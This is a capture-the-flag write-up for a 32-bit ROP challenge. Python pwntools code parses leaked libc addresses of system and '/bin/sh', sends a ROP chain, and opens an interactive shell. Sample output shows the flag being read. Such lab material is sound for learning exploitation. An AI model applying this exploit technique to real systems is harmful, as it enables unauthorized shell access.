# Writeup

The program presents us with a menu that allows us to print addresses of functions and strings in libc. It also allows us to insert a ROP chain.

The plan is to insert a ROP chain that executes `system("/bin/sh")`. The ROP chain will look like this: address of system, dummy return address, "/bin/sh".


We'll use `pwntools` to parse the information sent by the program. Here's some python code that will find the address of `system` and the string `/bin/sh`.
```python
from pwn import *

r = remote("127.0.0.1", 6666)

r.recvuntil("Choice: ")

# 2. print function address
r.sendline("2")
r.recvuntil("name: ")
r.sendline("system")
r.recvuntil("system: ")

system_addr = int(r.recvline().strip(), 16)
log.info("system addr: %s" % hex(system_addr))

# 4. search for string
r.recvuntil("Choice: ")
r.sendline("4")
r.recvuntil(": ")
r.sendline("/bin/sh")
r.recvuntil("at ")

bin_sh = int(r.recvline().strip()[:-1], 16)
log.info("/bin/sh addr: %s" % hex(bin_sh))

# 5. quit
r.sendline("5")
```

Here's an example of the output from the script:
```
$ python2 solv.py
[+] Opening connection to 127.0.0.1 on port 6666: Done
[*] system addr: 0xf759c3e0
[*] /bin/sh addr: 0xf76bda69
[*] Closed connection to 127.0.0.1 port 6666
```

ASLR is enabled, so the addresses will be different everytime we run the script. The only thing remaining now is inserting the ROP chain. We have to remember to pack the values before sending.

```python
rop = p32(system_addr)
rop += p32(0xdeadbeef)
rop += p32(bin_sh)

log.info("sending ROP chain")
r.sendline("3")
r.recvuntil("bytes: ")
r.sendline(rop)

r.interactive()
```

```
$ python2 solv.py
[+] Opening connection to 127.0.0.1 on port 6666: Done
[*] system addr: 0xf75ba3e0
[*] /bin/sh addr: 0xf76dba69
[*] sending ROP chain
[*] Switching to interactive mode
$ id
uid=1000(flag) gid=1000(flag) groups=1000(flag)
$ ls
flag.txt
$ cat flag.txt
TG16{32_bit_ROP_chains_are_easy_right?}
```

Full solution script can be found [here](src/solv.py).
